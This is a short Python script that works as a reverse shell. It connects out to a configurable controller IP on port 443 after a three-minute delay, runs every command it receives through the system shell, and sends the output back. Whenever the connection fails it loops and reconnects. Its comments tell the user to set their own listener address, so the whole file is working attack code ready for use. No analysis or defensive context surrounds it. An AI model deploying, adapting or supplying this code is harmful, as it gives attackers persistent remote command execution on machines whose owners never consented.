import socket
import subprocess
import time

# Configuration
CONTROLLER_HOST = '192.168.232.153'  # LHOST >> Change this To Your Local IP
CONTROLLER_PORT = 443  # LPORT >> Change the Port 
CONNECTION_DELAY = 180  # Delay Time to Receive the Connection >> 180 = 3 minutes 

def connect_to_controller(host, port):
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Delay the connection
    print(f"Waiting for {CONNECTION_DELAY} seconds before connecting...")
    time.sleep(CONNECTION_DELAY)
    connection.connect((host, port))
    return connection

def execute_command_and_send_output(conn, command):
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    conn.sendall(output + b"COMMAND_END")

def main():
    while True:
        try:
            conn = connect_to_controller(CONTROLLER_HOST, CONTROLLER_PORT)
            print("Connected to controller. Waiting for commands...")
            try:
                while True:
                    data = conn.recv(1024)
                    command = data.decode('utf-8').strip()
                    if command.lower() == 'exit':
                        break
                    execute_command_and_send_output(conn, command)
            finally:
                conn.close()
                print("Connection closed. Reconnecting in 120 seconds...")
        except Exception as e:
            print(f"Connection failed: {e}")
            print("Attempting to reconnect after delay...")
            time.sleep(CONNECTION_DELAY)

if __name__ == '__main__':
    main()
